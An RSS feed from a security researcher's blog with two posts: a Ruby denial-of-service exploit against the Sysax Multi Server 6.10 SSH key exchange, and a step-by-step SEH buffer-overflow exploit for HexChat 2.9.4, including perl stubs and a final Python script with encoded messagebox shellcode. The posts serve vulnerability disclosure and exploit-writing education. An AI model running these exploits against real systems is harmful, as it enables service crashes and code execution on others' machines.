<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Windows on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/windows/index.xml</link>
    <description>Recent content in Windows on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/windows/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Sysax Multi Server 6.10 SSH DoS</title>
      <link>https://www.mattandreko.com/2013/04/08/sysax-multi-server-6.10-ssh-dos/</link>
      <pubDate>Mon, 08 Apr 2013 08:27:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/2013/04/08/sysax-multi-server-6.10-ssh-dos/</guid>
      <description>

&lt;p&gt;I was recently fuzzing a bunch of SSH servers, hoping to find some remote code execution in a non-mainstream server. I ended up finding no code execution in the several that I tried, but I did find one pre-auth denial of service in Syax Multi Server 6.10.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&#34;try-this-at-home&#34;&gt;Try this at home!&lt;/h2&gt;

&lt;p&gt;The vulnerable version can be downloaded &lt;a href=&#34;https://www.dropbox.com/s/d6js8u6i4eioa1j/sysaxserv_setup_6.10.msi&#34;&gt;here&lt;/a&gt; for anyone that would like to duplicate the DoS conditions.&lt;/p&gt;

&lt;h2 id=&#34;understanding-the-key-exchange&#34;&gt;Understanding the Key Exchange&lt;/h2&gt;

&lt;p&gt;I found that during the key exchange, where the SSH client and SSH server negotiate which ciphers to use, if you messed up just a single specific byte, the server would crash. I started reading through the &lt;a href=&#34;https://tools.ietf.org/html/rfc4253#section-7.1&#34;&gt;RFC&lt;/a&gt; for SSH keyexchange, and found the key exchange to be mostly ASCII.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_ssh_hex.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I started playing with the byte that caused the crash, and it seemed that it was some sort of control character, or separator. I&amp;rsquo;m still unsure. However, changing it would cause a crash every time.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_ssh_hex2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I wasn&amp;rsquo;t able to figure out any way to get remote code execution, although someone smarter than me, may be able to do it. For now, I&amp;rsquo;ll settle with a DoS exploit.&lt;/p&gt;

&lt;h2 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env ruby
# Sysax Multi Server 6.10 SSH DoS
# Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
# http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html

require &#39;socket&#39;

unless ARGV.length == 2
  puts &amp;quot;Usage: ruby #{$0} [host] [port]\n&amp;quot;
  exit
end

packet = [0x00, 0x00, 0x03, 0x14, 0x08, 0x14, 0xff, 0x9f,
  0xde, 0x5d, 0x5f, 0xb3, 0x07, 0x8f, 0x49, 0xa7,
  0x79, 0x6a, 0x03, 0x3d, 0xaf, 0x55, 0x00, 0x00,
  0x00, 0x7e, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65,
  0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
  0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x2c, 0x64,
  0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65,
  0x6c, 0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72,
  0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68,
  0x61, 0x6e, 0x67, 0x65, 0x2d, 0x73, 0x68, 0x61,
  0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65,
  0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
  0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x34,
  0x2d, 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69,
  0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c,
  0x6c, 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f,
  0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x00, 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d,
  0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d,
  0x64, 0x73, 0x73, 0x00, 0x00, 0x00, 0x9d, 0x61,
  0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63, 0x62,
  0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77, 0x66,
  0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63, 0x66,
  0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c, 0x61,
  0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32, 0x35,
  0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f, 0x75,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39, 0x32,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65, 0x73,
  0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63, 0x2c,
  0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65, 0x6c,
  0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79, 0x73,
  0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69, 0x75,
  0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73, 0x31,
  0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c, 0x61,
  0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63, 0x74,
  0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35, 0x36,
  0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00, 0x9d,
  0x61, 0x65, 0x73, 0x31, 0x32, 0x38, 0x2d, 0x63,
  0x62, 0x63, 0x2c, 0x33, 0x64, 0x65, 0x73, 0x2d,
  0x63, 0x62, 0x63, 0x2c, 0x62, 0x6c, 0x6f, 0x77,
  0x66, 0x69, 0x73, 0x68, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x63, 0x61, 0x73, 0x74, 0x31, 0x32, 0x38,
  0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x72, 0x63,
  0x66, 0x6f, 0x75, 0x72, 0x31, 0x32, 0x38, 0x2c,
  0x61, 0x72, 0x63, 0x66, 0x6f, 0x75, 0x72, 0x32,
  0x35, 0x36, 0x2c, 0x61, 0x72, 0x63, 0x66, 0x6f,
  0x75, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x31, 0x39,
  0x32, 0x2d, 0x63, 0x62, 0x63, 0x2c, 0x61, 0x65,
  0x73, 0x32, 0x35, 0x36, 0x2d, 0x63, 0x62, 0x63,
  0x2c, 0x72, 0x69, 0x6a, 0x6e, 0x64, 0x61, 0x65,
  0x6c, 0x2d, 0x63, 0x62, 0x63, 0x40, 0x6c, 0x79,
  0x73, 0x61, 0x74, 0x6f, 0x72, 0x2e, 0x6c, 0x69,
  0x75, 0x2e, 0x73, 0x65, 0x2c, 0x61, 0x65, 0x73,
  0x31, 0x32, 0x38, 0x2d, 0x63, 0x74, 0x72, 0x2c,
  0x61, 0x65, 0x73, 0x31, 0x39, 0x32, 0x2d, 0x63,
  0x74, 0x72, 0x2c, 0x61, 0x65, 0x73, 0x32, 0x35,
  0x36, 0x2d, 0x63, 0x74, 0x72, 0x00, 0x00, 0x00,
  0x69, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64,
  0x35, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2c, 0x75, 0x6d, 0x61, 0x63,
  0x2d, 0x36, 0x34, 0x40, 0x6f, 0x70, 0x65, 0x6e,
  0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c,
  0x68, 0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70,
  0x65, 0x6d, 0x64, 0x31, 0x36, 0x30, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x72, 0x69, 0x70, 0x65,
  0x6d, 0x64, 0x31, 0x36, 0x30, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73,
  0x68, 0x61, 0x31, 0x2d, 0x39, 0x36, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2d,
  0x39, 0x36, 0x00, 0x00, 0x00, 0x69, 0x68, 0x6d,
  0x61, 0x63, 0x2d, 0x6d, 0x64, 0x35, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2c, 0x75, 0x6d, 0x61, 0x63, 0x2d, 0x36, 0x34,
  0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68,
  0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68, 0x6d, 0x61,
  0x63, 0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64,
  0x31, 0x36, 0x30, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x72, 0x69, 0x70, 0x65, 0x6d, 0x64, 0x31,
  0x36, 0x30, 0x40, 0x6f, 0x70, 0x65, 0x6e, 0x73,
  0x73, 0x68, 0x2e, 0x63, 0x6f, 0x6d, 0x2c, 0x68,
  0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31,
  0x2d, 0x39, 0x36, 0x2c, 0x68, 0x6d, 0x61, 0x63,
  0x2d, 0x6d, 0x64, 0x35, 0x2d, 0x39, 0x36, 0x00,
  #3rd byte in this next line causes crash
  0x00, 0x00, 0x28, 0x7a, 0x6c, 0x69, 0x62, 0x40,
  0x6f, 0x70, 0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e,
  0x63, 0x6f, 0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62,
  0x2c, 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00,
  0x1a, 0x7a, 0x6c, 0x69, 0x62, 0x40, 0x6f, 0x70,
  0x65, 0x6e, 0x73, 0x73, 0x68, 0x2e, 0x63, 0x6f,
  0x6d, 0x2c, 0x7a, 0x6c, 0x69, 0x62, 0x2c, 0x6e,
  0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00].pack(&amp;quot;C*&amp;quot;)

host = ARGV[0]
port = ARGV[1]

sock = TCPSocket.open(host, port)

banner = sock.gets()
puts banner

sock.puts(&amp;quot;SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1\r\n&amp;quot;)
sock.puts(packet)
resp = sock.gets()

sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;

&lt;p&gt;I contacted the developers of Sysax Multi Server on March 18 2013 and April 6 2013. They were able to release a new version (6.11) which is no longer vulnerable to this bug. If you&amp;rsquo;re running Sysax Multi Server with SSH (off by default, but plenty of users on &lt;a href=&#34;http://www.shodanhq.com/search?q=sysax+port%3A22&#34;&gt;ShodanHQ&lt;/a&gt;), I would highly recommend updating to 6.11, available &lt;a href=&#34;http://www.sysax.com/download.htm#sysaxserv&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;update&#34;&gt;Update:&lt;/h2&gt;

&lt;p&gt;It looks like the Metasploit module I wrote for this has been merged! You can view it &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/225342ce8f34b1af49e498c0cc6fa92c127187e8/modules/auxiliary/dos/windows/ssh/sysax_sshd_kexchange.rb&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Buffer Overflow in HexChat 2.9.4</title>
      <link>https://www.mattandreko.com/2013/04/06/buffer-overflow-in-hexchat-2.9.4/</link>
      <pubDate>Sat, 06 Apr 2013 14:55:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/2013/04/06/buffer-overflow-in-hexchat-2.9.4/</guid>
      <description>

&lt;p&gt;A buddy of mine, &lt;a href=&#34;https://twitter.com/imulitia&#34;&gt;Mulitia&lt;/a&gt;, and I were talking about 0-days, and he mentioned finding one in Hex-Chat, a popular IRC client. It was super low severity, but still neat. If you entered &amp;ldquo;/server &amp;rdquo; followed by 20,000 random characters, the application died. I decided to try to make a working exploit out of this for fun.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I contacted HexChat, by initialling going into the #hexchat channel on irc.freenode.net and trying to find a security contact. TingPing said I could give the details specifically through him. Eventually an issue was created: &lt;a href=&#34;https://github.com/hexchat/hexchat/issues/463&#34;&gt;https://github.com/hexchat/hexchat/issues/463&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;walkthrough-of-the-exploit&#34;&gt;Walkthrough of the exploit&lt;/h2&gt;

&lt;p&gt;This exploit was a little more complicated than many I&amp;rsquo;ve had to do previously. It has 3 stages, due to bad characters that can&amp;rsquo;t be entered in the payload (pretty much anything non-alpha-numeric).&lt;/p&gt;

&lt;h2 id=&#34;the-offset&#34;&gt;The offset&lt;/h2&gt;

&lt;p&gt;First thing&amp;rsquo;s first, when developing an exploit, you need to have the offset of the buffer so you know where to put executable statements. By using the pattern_create functionality of Mona.py, I made a 25,000 line unique string, and ran it into the program while attached to a debugger.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pc.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I then took this long pattern, and pasted it into HexChat&amp;rsquo;s textbox, after a &amp;ldquo;/server &amp;rdquo; string:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_pattern.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once I hit enter, the debugger stated:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Access violation when writing to [00130000] - use Shift+F7/F8/F9 to pass the exception to the program&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since an exception was raised, I checked the SEH window, to see if I had overwritten the SEH handler.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Indeed, I had overwritten the SEH handler with &amp;ldquo;37635236&amp;rdquo;. I then ran mona&amp;rsquo;s pattern_offset to find the offset of the string that would overwrite the SEH handler.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_po.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Based on this knowledge, I knew the offset would be somewhere around 13340 bytes in. Since this was an SEH exploit, the next step was to find an instruction that did a pop-pop-ret.&lt;/p&gt;

&lt;h2 id=&#34;pop-pop-ret&#34;&gt;Pop-Pop-Ret&lt;/h2&gt;

&lt;p&gt;Finding a valid pop-pop-ret instruction became a bit difficult, because I started to find out that HexChat would pretty much only use ASCII characters. Luckily, Mona.py had me covered, and can search for filtered characters:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_mona_seh.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I went through the seh.txt file that had all the addresses, and found one that I liked:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;0x68626463 : pop ebx # pop ebp # ret | asciiprint,ascii,lower {PAGE_EXECUTE_READ} [libglib-2.0-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.26.1.0 (C:\Program Files\HexChat\libglib-2.0-0.dll)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This string was all lowercase letters, had no ASLR or SafeSEH, so it seemed like a fairly good address to use.&lt;/p&gt;

&lt;h2 id=&#34;the-jump&#34;&gt;The jump&lt;/h2&gt;

&lt;p&gt;I created a little test exploit stub so I could see the memory after the pop-pop-ret occurred. It wasn&amp;rsquo;t really anything special.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13340 . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I pasted it into HexChat, and saw the same Access Violation. I checked the SEH window to make sure I overwrote properly:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_seh2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;You can see there, that the SEH is now pointing to the address of the pop-pop-ret. I created a breakpoint for 0x68626463 and hit Shift-F9. I hit the breakpoint, and F7 3 times to step through the pop-pop-ret.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_ppr.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Typically, in an SEH exploit, right before the PPR instruction, you&amp;rsquo;d put the next instruction that you want to execute, the nseh (more details at &lt;a href=&#34;https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/&#34;&gt;Corelan&amp;rsquo;s excellent blog&lt;/a&gt;). This instruction is typically a jump. Due to our ascii issue, I found it was possible to do a 21 byte jump, by using a conditional &amp;ldquo;JA&amp;rdquo; jump (see &lt;a href=&#34;http://www.unixwiz.net/techtips/x86-jumps.html&#34;&gt;here&lt;/a&gt; for jump details) instruction. I had to prepend 2 &amp;ldquo;DEC ESP&amp;rdquo; instructions to make the conditional jump work, by setting the proper flags. This left my exploit stub looking like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x11656&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;getting-more-space&#34;&gt;Getting more space&lt;/h2&gt;

&lt;p&gt;I ran the exploit stub, followed the pop-pop-ret and then the jump, and found myself in memory that I controlled. That was the good news. Unfortunately, the bad news was that I only had a very limited amount of space to put any payload (43 bytes). My first thought was to use an egghunter, however egghunters had non-ascii characters in them, and when encoded properly, were well over 43 bytes long. This left me thinking for a good while.&lt;/p&gt;

&lt;p&gt;After a couple days of thinking, I thought about using a fairly non-traditional method to exploit this. In the stack, way down, was a pointer to the beginning of the buffer I sent into HexChat. I was able to use the &lt;a href=&#34;https://en.wikipedia.org/wiki/X86_instruction_listings&#34;&gt;POPAD instruction&lt;/a&gt; to get rid of several ESP values at once, since it&amp;rsquo;s Opcode was an ASCII character. By combining 38 POPAD instructions, I was able to get to the pointer in memory, and still have 5 bytes of memory to try to load it. My exploit-stub ended up looking like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ perl -e &#39;print &amp;quot;A&amp;quot;x13336 . &amp;quot;\x4c\x4c\x77\x21&amp;quot; . &amp;quot;\x63\x64\x62\x68&amp;quot; . &amp;quot;C&amp;quot;x29 . &amp;quot;\x61&amp;quot;x38 . &amp;quot;C&amp;quot;x11589&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I ran it through the debugger, it worked out perfectly.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_popad.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;finding-the-jump-via-corruption&#34;&gt;Finding the jump via corruption&lt;/h2&gt;

&lt;p&gt;With only 5 bytes remaining, and ASCII encoding requirements, I pondered a bit. I couldn&amp;rsquo;t see any way to get a &amp;ldquo;JMP ESP&amp;rdquo;. I found a JMP ESP in one of the loaded libraries, but I didn&amp;rsquo;t have enough space to push it into memory and then RETN. For some reason, during testing, I found that some of my non-ASCII characters were bad-characters, and would get translated to RETN statements. I thought perhaps I could use a &amp;ldquo;PUSH ESP&amp;rdquo; instruction which was ASCII, and then use a bad-character to convert into a &amp;ldquo;RETN&amp;rdquo; instruction, since it typically would not be ASCII (\xc3). It ended up working. I put a &amp;ldquo;\xE9&amp;rdquo;, and it converted it to &amp;ldquo;RETN&amp;rdquo; and then an &amp;ldquo;\x88&amp;rdquo;. Since I&amp;rsquo;d never be hitting the &amp;ldquo;\x88&amp;rdquo; I figured this would work. I tried it, and miraculously it did! Using a corrupted character actually let it jump!&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_push_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After taking the &amp;ldquo;RETN&amp;rdquo;, it placed me in an area with thousands of bytes for shellcode.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/hexchat_after_push_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;From this point, it was just as easy as inserting some alpha-numeric encoded shellcode, and changing some lengths of junk strings.&lt;/p&gt;

&lt;h2 id=&#34;the-final-working-exploit&#34;&gt;The final working exploit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
# HexChat 2.9.4 Local Exploit
# Bug found by Jules Carter &amp;lt; @iMulitia &amp;gt;
# Exploit by Matt &amp;quot;hostess&amp;quot; Andreko &amp;lt; mandreko [at] accuvant.com &amp;gt;
# http://www.mattandreko.com/2013/04/buffer-overflow-in-hexchat-294.html
junk1 = &amp;quot;B&amp;quot;*30
shellcode = (
# msfvenom -p windows/messagebox EXITFUNC=process BufferRegister=ESP -e x86/alpha_mixed -f c
&amp;quot;\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&amp;quot;
&amp;quot;\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b&amp;quot;
&amp;quot;\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58&amp;quot;
&amp;quot;\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x68\x6b\x6d\x4b\x4b\x69&amp;quot;
&amp;quot;\x44\x34\x64\x64\x59\x64\x74\x71\x78\x52\x6c\x72\x33\x47\x34&amp;quot;
&amp;quot;\x71\x78\x49\x42\x44\x4e\x6b\x50\x71\x50\x30\x4e\x6b\x64\x36&amp;quot;
&amp;quot;\x54\x4c\x4c\x4b\x44\x36\x77\x6c\x4c\x4b\x33\x76\x77\x78\x4c&amp;quot;
&amp;quot;\x4b\x73\x4e\x51\x30\x4e\x6b\x75\x66\x56\x58\x72\x6f\x72\x38&amp;quot;
&amp;quot;\x51\x65\x68\x73\x43\x69\x37\x71\x38\x51\x39\x6f\x58\x61\x73&amp;quot;
&amp;quot;\x50\x4e\x6b\x30\x6c\x36\x44\x77\x54\x6c\x4b\x42\x65\x75\x6c&amp;quot;
&amp;quot;\x6e\x6b\x73\x64\x36\x48\x31\x68\x46\x61\x6a\x4a\x4e\x6b\x52&amp;quot;
&amp;quot;\x6a\x66\x78\x6e\x6b\x73\x6a\x57\x50\x43\x31\x7a\x4b\x6d\x33&amp;quot;
&amp;quot;\x34\x74\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x67\x71\x48\x6e\x74&amp;quot;
&amp;quot;\x71\x6b\x4f\x36\x51\x79\x50\x6b\x4c\x4e\x4c\x4c\x44\x39\x50&amp;quot;
&amp;quot;\x34\x34\x75\x57\x49\x51\x4a\x6f\x36\x6d\x67\x71\x4a\x67\x5a&amp;quot;
&amp;quot;\x4b\x5a\x54\x67\x4b\x71\x6c\x61\x34\x34\x68\x32\x55\x6d\x31&amp;quot;
&amp;quot;\x6e\x6b\x33\x6a\x47\x54\x76\x61\x38\x6b\x71\x76\x4c\x4b\x64&amp;quot;
&amp;quot;\x4c\x52\x6b\x4e\x6b\x71\x4a\x67\x6c\x67\x71\x4a\x4b\x4e\x6b&amp;quot;
&amp;quot;\x74\x44\x4c\x4b\x76\x61\x69\x78\x4e\x69\x62\x64\x66\x44\x47&amp;quot;
&amp;quot;\x6c\x63\x51\x5a\x63\x6e\x52\x33\x38\x61\x39\x69\x44\x6b\x39&amp;quot;
&amp;quot;\x59\x75\x6c\x49\x58\x42\x73\x58\x4e\x6e\x72\x6e\x56\x6e\x58&amp;quot;
&amp;quot;\x6c\x62\x72\x4d\x38\x4f\x6f\x6b\x4f\x69\x6f\x69\x6f\x4f\x79&amp;quot;
&amp;quot;\x61\x55\x75\x54\x6d\x6b\x31\x6e\x4e\x38\x79\x72\x70\x73\x6f&amp;quot;
&amp;quot;\x77\x45\x4c\x45\x74\x70\x52\x39\x78\x6c\x4e\x4b\x4f\x49\x6f&amp;quot;
&amp;quot;\x59\x6f\x6f\x79\x43\x75\x55\x58\x73\x58\x62\x4c\x70\x6c\x51&amp;quot;
&amp;quot;\x30\x77\x31\x53\x58\x67\x43\x54\x72\x66\x4e\x61\x74\x71\x78&amp;quot;
&amp;quot;\x52\x55\x44\x33\x62\x45\x61\x62\x6d\x58\x51\x4c\x75\x74\x57&amp;quot;
&amp;quot;\x7a\x4c\x49\x58\x66\x73\x66\x6b\x4f\x30\x55\x47\x74\x6b\x39&amp;quot;
&amp;quot;\x4f\x32\x72\x70\x4d\x6b\x39\x38\x6d\x72\x72\x6d\x4f\x4c\x4b&amp;quot;
&amp;quot;\x37\x35\x4c\x67\x54\x30\x52\x5a\x48\x75\x31\x39\x6f\x6b\x4f&amp;quot;
&amp;quot;\x39\x6f\x33\x58\x42\x4f\x34\x38\x53\x68\x31\x30\x72\x48\x35&amp;quot;
&amp;quot;\x31\x73\x57\x61\x75\x62\x62\x35\x38\x72\x6d\x72\x45\x54\x33&amp;quot;
&amp;quot;\x62\x53\x54\x71\x69\x4b\x6f\x78\x33\x6c\x75\x74\x54\x4a\x6f&amp;quot;
&amp;quot;\x79\x78\x63\x61\x78\x72\x78\x45\x70\x77\x50\x75\x70\x70\x68&amp;quot;
&amp;quot;\x72\x6d\x50\x53\x37\x36\x77\x51\x70\x68\x43\x42\x30\x6f\x42&amp;quot;
&amp;quot;\x4d\x71\x30\x35\x38\x52\x4f\x66\x4c\x31\x30\x61\x76\x61\x78&amp;quot;
&amp;quot;\x71\x58\x50\x65\x42\x4c\x32\x4c\x55\x61\x5a\x69\x6e\x68\x72&amp;quot;
&amp;quot;\x6c\x61\x34\x44\x50\x4f\x79\x4d\x31\x56\x51\x4b\x62\x33\x62&amp;quot;
&amp;quot;\x61\x43\x46\x31\x52\x72\x39\x6f\x58\x50\x46\x51\x49\x50\x42&amp;quot;
&amp;quot;\x70\x69\x6f\x36\x35\x34\x48\x41\x41&amp;quot;
)
junk2 = &amp;quot;A&amp;quot;*(13306-len(shellcode))
stage1 = &amp;quot;\x4c\x4c\x77\x21&amp;quot; # 21 byte jump (JA)
ret = &amp;quot;\x63\x64\x62\x68&amp;quot; # ASCII PPR
junk3 = &amp;quot;C&amp;quot;*29
stage2 = &amp;quot;\x61&amp;quot;*38 # POPAD x 38
stage2 += &amp;quot;\x54&amp;quot; # PUSH ESP
stage2 += &amp;quot;\xE9&amp;quot; # RETN # This byte is a bad char, but gets converted to RETN and \x88
junk4 = &amp;quot;D&amp;quot;*11586

print &amp;quot;Copy this text, and enter into HexChat&#39;s textbox: \&amp;quot;/server [string]\&amp;quot;&amp;quot; 
print junk1 + shellcode + junk2 + stage1 + ret + junk3 + stage2 + junk4
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;demo-time&#34;&gt;Demo time!&lt;/h2&gt;

&lt;p&gt;Here is a video demo of the exploit working with a simple messagebox payload.

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;//www.youtube.com/embed/izmMjz_g-84&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
 &lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;

